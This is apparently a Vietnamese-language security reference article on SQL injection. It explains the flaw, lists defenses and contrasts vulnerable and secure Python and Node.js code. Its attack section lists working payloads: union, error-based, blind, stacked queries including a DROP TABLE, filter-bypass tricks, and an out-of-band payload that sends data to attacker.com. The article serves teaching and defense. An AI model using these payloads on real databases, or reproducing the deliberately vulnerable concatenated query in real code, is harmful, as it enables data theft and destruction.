# SQL Injection

> **CWE**: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) | **Phân loại**: Injection

## Kiến thức Nền tảng

Hãy tưởng tượng cơ sở dữ liệu (Database) giống như một kho lưu trữ thông tin khổng lồ và SQL là ngôn ngữ giao tiếp để bạn yêu cầu người giữ kho lấy dữ liệu ra cho mình. Trong các cuộc đối thoại an toàn, lập trình viên sử dụng các câu lệnh đã được biên dịch sẵn (Prepared Statements) giống như một biểu mẫu điền thông tin có sẵn các ô trống. Khi bạn điền thông tin vào các ô trống này, người giữ kho chỉ coi đó là dữ liệu thuần túy và không bao giờ nhầm lẫn chúng với các mệnh lệnh hành động. Các ký tự như dấu nháy đơn `'` hay dấu chú thích `--` trong SQL thường được dùng để phân định ranh giới chuỗi và viết ghi chú.

```python
import sqlite3

def get_user_by_email(email):
    # Establish connection to the database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Normal operation using parameterized query (prepared statement)
    # The database engine compiles the SQL query structure first,
    # then binds the email parameter as a literal value, preventing SQL injection.
    query = "SELECT id, username, email FROM users WHERE email = ?"
    cursor.execute(query, (email,))
    
    user = cursor.fetchone()
    conn.close()
    return user
```

## Mô tả lỗ hổng

Lỗ hổng SQL Injection (SQLi) xuất hiện khi ứng dụng web không dùng các biểu mẫu điền thông tin an toàn mà lại trực tiếp nối chuỗi thông tin của người dùng vào câu lệnh gửi cho người giữ kho. Điều này giống như việc bạn viết thêm một dòng chữ ra lệnh mới vào ngay bên cạnh tên của mình trên tờ giấy yêu cầu. Kẻ tấn công có thể chèn các từ khóa SQL hoặc dấu nháy đơn để bẻ gãy câu lệnh gốc, buộc cơ sở dữ liệu phải thực thi những hành động ngoài ý muốn. Chẳng hạn, thay vì chỉ tìm kiếm một sản phẩm, câu lệnh bị biến thành "hãy hiển thị mật khẩu của toàn bộ người dùng". Lỗ hổng này vô cùng nguy hiểm vì nó có thể dẫn đến việc rò rỉ thông tin nhạy cảm của hàng triệu khách hàng, xóa sạch cơ sở dữ liệu, hoặc thậm chí giúp kẻ tấn công chiếm quyền điều khiển hoàn toàn máy chủ.

## Cơ chế tấn công

Các biến thể tấn công SQL Injection phổ biến bao gồm:

*   **Union-based SQLi**: Kẻ tấn công sử dụng toán tử `UNION` để gộp kết quả truy vấn gốc với truy vấn độc hại.
    *   *Xác định số cột*: `' ORDER BY 3--` (nếu không lỗi thì bảng có ít nhất 3 cột).
    *   *Trích xuất cấu trúc dữ liệu*: `' UNION SELECT 1, table_name, 3 FROM information_schema.tables--`
*   **Error-based SQLi**: Lợi dụng thông báo lỗi từ hệ quản trị cơ sở dữ liệu (DBMS) để trích xuất dữ liệu.
    *   *Payload MySQL*: `' AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)--` hoặc `' AND extractvalue(1, concat(0x7e, (SELECT version())))--`
*   **Blind Boolean-based SQLi**: Trích xuất dữ liệu bằng cách đặt câu hỏi True/False và quan sát sự thay đổi trong phản hồi của trang web.
    *   *Payload*: `' AND SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1) = 'a'--`
*   **Blind Time-based SQLi**: Khi ứng dụng không hiển thị dữ liệu hay lỗi, kẻ tấn công đo thời gian phản hồi của máy chủ để dò tìm dữ liệu.
    *   *Payload MySQL*: `' AND IF(1=1, SLEEP(5), 0)--`
    *   *Payload SQL Server*: `'; WAITFOR DELAY '0:0:5'--`
*   **Stacked Queries**: Thực thi nhiều câu lệnh tuần tự bằng cách phân tách chúng bằng dấu chấm phẩy `;`.
    *   *Payload*: `'; DROP TABLE users--`
*   **Out-of-Band (OOB) SQLi**: Kích hoạt kết nối mạng (DNS/HTTP) từ database tới máy chủ kẻ tấn công để truyền dữ liệu.
    *   *Payload MySQL*: `' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\a'))--`
*   **WAF Bypass**: Vượt qua các bộ lọc bằng cách thay đổi cách viết payload.
    *   *Xen kẽ chữ hoa/thường*: `UnIoN SeLeCt`
    *   *Sử dụng chú thích*: `UNION/**/SELECT`
    *   *Comment injection*: `/*!UNION*/ /*!SELECT*/`
    *   *Hex encoding*: `0x554e494f4e`

## Biện pháp phòng thủ

- **Tóm tắt**: Sử dụng các câu lệnh truy vấn tham số hóa (prepared statements), các framework ORM và kiểm tra nghiêm ngặt kiểu dữ liệu đầu vào.
- **Các bước chi tiết**:
  - Sử dụng truy vấn tham số hóa cho mọi câu lệnh SQL để tách biệt cấu trúc lệnh và dữ liệu.
  - Sử dụng các thư viện ORM (như SQLAlchemy, Hibernate) vì chúng tự động tham số hóa các truy vấn.
  - Xác thực kiểu dữ liệu đầu vào nghiêm ngặt (nhập số thì ép kiểu integer).
  - Giới hạn quyền tối thiểu cho tài khoản cơ sở dữ liệu kết nối từ ứng dụng.

## Code Example

```python
# === VULNERABLE CODE (Python Flask) ===
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/user')
def get_user_vulnerable():
    username = request.args.get('username')
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # DANGER: Direct string concatenation leads to Union, Error, Blind, or Stacked SQLi
    query = f"SELECT bio FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return str(cursor.fetchall())

# === SECURE CODE (Python Flask) ===
@app.route('/secure-user')
def get_user_secure():
    username = request.args.get('username')
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # SECURE: Using placeholder '?' to ensure safe parameter binding
    query = "SELECT bio FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return str(cursor.fetchall())
```

```javascript
// === SECURE CODE (Node.js - pg client) ===
const { Client } = require('pg');

async function getUserSecure(email) {
  const client = new Client();
  await client.connect();
  try {
    // SECURE: Parameterized query using placeholders
    const query = {
      text: 'SELECT name, bio FROM users WHERE email = $1',
      values: [email],
    };
    const res = await client.query(query);
    return res.rows[0];
  } finally {
    await client.end();
  }
}
```

## Xem thêm

- [Second-Order SQL Injection](../second-order-sqli/) — Lỗ hổng SQLi bậc hai xảy ra khi dữ liệu nhập vào được lưu trong DB trước khi được truy vấn không an toàn ở một chức năng khác.
- [NoSQL Injection](../nosql-injection/) — Tương tự SQLi nhưng nhắm vào các hệ quản trị cơ sở dữ liệu phi quan hệ như MongoDB.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/sql-injection
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE: https://cwe.mitre.org/data/definitions/89.html

## Giải thích thuật ngữ

- **SQL (Structured Query Language)**: Ngôn ngữ truy vấn có cấu trúc dùng để tương tác với cơ sở dữ liệu.
- **SQL Injection (SQLi)**: Lỗ hổng cho phép kẻ tấn công chèn lệnh SQL tùy ý để thao túng cơ sở dữ liệu.
- **Prepared Statement**: Kỹ thuật biên dịch trước câu lệnh SQL và truyền dữ liệu dạng đối số độc lập để đảm bảo an toàn.
- **RDBMS**: Hệ quản trị cơ sở dữ liệu quan hệ lưu trữ dữ liệu dưới dạng các bảng có liên kết với nhau.
- **Database**: Hệ thống lưu trữ dữ liệu tập trung của ứng dụng.
